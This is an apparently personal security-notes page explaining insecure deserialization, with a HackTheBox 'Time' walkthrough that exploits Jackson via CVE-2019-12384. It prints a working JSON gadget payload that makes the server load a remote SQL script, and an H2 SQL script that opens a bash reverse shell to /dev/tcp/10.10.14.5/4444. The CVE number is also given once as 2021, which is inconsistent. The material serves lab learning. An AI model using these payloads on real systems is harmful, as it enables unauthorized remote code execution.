# Deserialization

Deserialization exploits the fact that a website may directly pass user input to a function that does not check the user input, which may have malicious functions or code.&#x20;

## How it Works

We first need to understand what serialization is.

<figure><img src="../.gitbook/assets/image (2597).png" alt=""><figcaption><p><em>Taken from Portswigger Web Security Academy</em></p></figcaption></figure>

Websites would take in input via some function, and then serialize it into a certain format to be passed back to the server for processing. This format can be in form of a string, base64 encoded, binary, etc. Depends on the language and functions used for the website.&#x20;

The security flaw happens when the website deserializes it back and processes it. This would give an attacker control over objects passed into the application, which can be harmful. Most of the time, the flaw comes from the general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should **never be deserialized at all**.&#x20;

It is impossible to check for every single potential thing in deserialized data to ensure it is safe. Also, even if checks are implemented, it may already be too late as the data can cause an exception in the code through the deserialization process.

This kind of attack mainly leads to RCE or DoS conditions on a website, which are really severe. **In short, never trust user input.**

## Example

The HTB machine, Time, has a deserialization in Java making use of CVE-2021-12384. The machine has a website that basically takes in JSON input and beautifies it.

<figure><img src="../.gitbook/assets/image (2458).png" alt=""><figcaption></figcaption></figure>

We can enter some random JSON objects and it would output it as you would expect. If we enter some weird input, an error like this would appear:

<figure><img src="../.gitbook/assets/image (1970).png" alt=""><figcaption></figcaption></figure>

We can see that the website uses Jackson to execute the function. Jackson is vulnerable to CVE-2019-12384, which is an RCE exploit involving passing this URL as a JSON object to be serialized:

```
["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:8000/inject.sql'"}]
```

The payload above exploits SSRF and makes the website request any link of our own, and in this case, we can run SQL scripts directly through this callback. This would allow us to craft a malicious SQL Script that would give us a reverse shell.

```sql
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
   String[] command = {"bash", "-c", cmd};
   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
   return s.hasNext() ? s.next() : "";  }
$$;
CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"')
```

This is one example of how input was not sanitised on the website, and it processed the JSON object we input although it was only supposed to beautify it.
